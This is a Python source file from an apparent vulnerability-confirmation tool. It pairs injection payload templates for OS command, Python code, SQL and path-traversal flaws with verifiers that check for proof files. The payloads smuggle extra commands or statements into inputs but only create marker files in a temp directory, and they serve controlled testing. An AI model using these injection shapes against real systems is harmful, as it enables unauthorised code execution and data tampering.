"""Per-CWE exploit strategies for VULCAN Tier-2.

Each strategy supplies, for one CWE:
  * a bank of attacker payload TEMPLATES (seeded from the public, well-known
    injection patterns catalogued in projects like PayloadsAllTheThings --
    these are the generic shapes, not secrets), each written against a
    per-attempt ProofContext via placeholder tokens, and
  * a deterministic verify() that checks for a REAL observable effect of the
    attack -- a file the attack created, a DB table an injected statement
    created, a write that escaped its directory. The sink merely firing is
    NOT enough; the observable must be present.

Placeholders substituted per attempt (see ProofContext.render):
  __PROOF__    an absolute path the attack should cause to be created/written
  __PROOFDB__  an absolute path an injected ATTACH DATABASE should create
  __SECRET__   an absolute path holding a planted canary (exfil targets)
  __CANARY__   the canary string planted in __SECRET__
  __NONCE__    a unique token to write/grep for
"""
from __future__ import annotations

import os
import sqlite3
import tempfile
import uuid
from dataclasses import dataclass


@dataclass
class ProofContext:
    """A fresh, isolated set of proof artifacts for ONE exploit attempt.

    Everything lives under a unique temp dir with a unique nonce, so one
    attempt's observable can never be mistaken for another's, and a stale
    file from a previous payload can never cause a false CONFIRMED."""
    base: str
    nonce: str
    proof_file: str
    proof_db: str
    secret_file: str
    canary: str

    @classmethod
    def new(cls) -> "ProofContext":
        base = tempfile.mkdtemp(prefix="tier2_proof_")
        nonce = uuid.uuid4().hex[:12]
        canary = "CANARY_" + uuid.uuid4().hex[:16]
        return cls(
            base=base, nonce=nonce, canary=canary,
            proof_file=os.path.join(base, f"pwned_{nonce}"),
            proof_db=os.path.join(base, f"pwn_{nonce}.db"),
            secret_file=os.path.join(base, f"secret_{nonce}.txt"),
        )

    def render(self, template: str) -> str:
        return (template
                .replace("__PROOFDB__", self.proof_db)
                .replace("__PROOF__", self.proof_file)
                .replace("__SECRET__", self.secret_file)
                .replace("__CANARY__", self.canary)
                .replace("__NONCE__", self.nonce))

    def cleanup(self) -> None:
        import shutil
        try:
            shutil.rmtree(self.base, ignore_errors=True)
        except OSError:
            pass


@dataclass
class ExploitStrategy:
    cwe: str
    name: str
    goal: str                 # plain-English observable goal (also shown to the agent)
    templates: list           # payload templates (strings with placeholder tokens)

    def setup(self, ctx: ProofContext) -> None:
        """Plant anything the attack needs (e.g. a canary file). Default: none."""
        return None

    def verify(self, ctx: ProofContext) -> tuple:
        """Return (confirmed: bool, proof_description: str)."""
        raise NotImplementedError


# ---------------------------------------------------------------------------
# CWE-78 -- OS command injection. Observable: our injected shell command runs
# and creates the proof file.
# ---------------------------------------------------------------------------
class _CmdInjection(ExploitStrategy):
    def verify(self, ctx):
        if os.path.exists(ctx.proof_file):
            return True, f"injected shell command created {ctx.proof_file}"
        return False, ""


CWE78 = _CmdInjection(
    cwe="CWE-78", name="os-command-injection",
    goal="cause the program to execute an extra shell command that creates the file __PROOF__",
    templates=[
        "; touch __PROOF__",
        "&& touch __PROOF__",
        "| touch __PROOF__",
        "$(touch __PROOF__)",
        "`touch __PROOF__`",
        "; echo __NONCE__ > __PROOF__",
        "\ntouch __PROOF__\n",
        "x; touch __PROOF__ #",
        "'; touch __PROOF__; '",
        "\"; touch __PROOF__; \"",
    ],
)


# ---------------------------------------------------------------------------
# CWE-94 -- code injection (Python eval/exec of attacker input). Observable:
# our injected Python writes the proof file.
# ---------------------------------------------------------------------------
class _CodeInjection(ExploitStrategy):
    def verify(self, ctx):
        if os.path.exists(ctx.proof_file):
            return True, f"injected Python code created {ctx.proof_file}"
        return False, ""


CWE94 = _CodeInjection(
    cwe="CWE-94", name="python-code-injection",
    goal="cause the program to execute injected Python that creates the file __PROOF__",
    templates=[
        "__import__('os').system('touch __PROOF__')",
        "open('__PROOF__','w').write('__NONCE__')",
        "[open('__PROOF__','w').write('__NONCE__')]",
        "(open('__PROOF__','w').write('__NONCE__'))",
        "'+open('__PROOF__','w').write('__NONCE__')+'",
        "';__import__('os').system('touch __PROOF__');'",
        "__import__('os').system('touch __PROOF__')#",
    ],
)


# ---------------------------------------------------------------------------
# CWE-89 -- SQL injection. Observable (side-effect proof, no output capture
# needed): an injected multi-statement ATTACHes a new database file and
# CREATEs a table in it. We then open that file and confirm the table exists.
# This proves a write-capable injection on sinks that reach executescript /
# multi-statement execution. (Pure single-statement UNION read-exfil would
# need the function's return value -- a documented v2 extension -- so those
# honestly come back NOT_CONFIRMED here rather than over-claimed.)
# ---------------------------------------------------------------------------
class _SqlInjection(ExploitStrategy):
    def verify(self, ctx):
        if not os.path.exists(ctx.proof_db):
            return False, ""
        try:
            con = sqlite3.connect(ctx.proof_db)
            row = con.execute(
                "SELECT name FROM sqlite_master WHERE type='table' AND name='pwned'"
            ).fetchone()
            con.close()
        except sqlite3.Error:
            return False, ""
        if row is not None:
            return True, f"injected SQL ATTACHed {ctx.proof_db} and CREATEd table 'pwned'"
        return False, ""


CWE89 = _SqlInjection(
    cwe="CWE-89", name="sql-injection",
    goal=("break out of the SQL string and run an extra statement that does: "
          "ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x);"),
    templates=[
        "'); ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
        "'; ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
        "; ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
        "x'); ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); -- ",
        "\"); ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
        "1; ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
    ],
)


# ---------------------------------------------------------------------------
# CWE-22 -- path traversal. Observable: a WRITE sink is steered to create our
# proof file OUTSIDE its intended directory. The strongest, base-dir-agnostic
# payload is an absolute path: Python's os.path.join(base, abs) and
# Path(base)/abs both discard `base` when the second component is absolute, so
# an absolute payload lands exactly where we choose. Classic ../ ladders are
# included as fallbacks. (Read-only traversal that merely returns file
# contents needs output capture -- v2 -- so it honestly stays NOT_CONFIRMED.)
# ---------------------------------------------------------------------------
class _PathTraversal(ExploitStrategy):
    def setup(self, ctx):
        # plant a canary in case a future read-exfil verifier wants it; the
        # write-escape proof below does not depend on it.
        try:
            with open(ctx.secret_file, "w") as fh:
                fh.write(ctx.canary)
        except OSError:
            pass

    def verify(self, ctx):
        if os.path.exists(ctx.proof_file):
            return True, f"traversal write escaped to {ctx.proof_file}"
        return False, ""


CWE22 = _PathTraversal(
    cwe="CWE-22", name="path-traversal",
    goal="steer a file write to the absolute path __PROOF__, outside the intended directory",
    templates=[
        "__PROOF__",
        "../../../../../../../../../../.." + os.sep,   # ladder prefix (fallback)
        "....//....//....//....//....//....//" ,        # filter-bypass ladder
        "..%2f..%2f..%2f..%2f..%2f..%2f",               # encoded ladder (if sink unquotes)
    ],
)


STRATEGIES = {s.cwe: s for s in (CWE78, CWE94, CWE89, CWE22)}
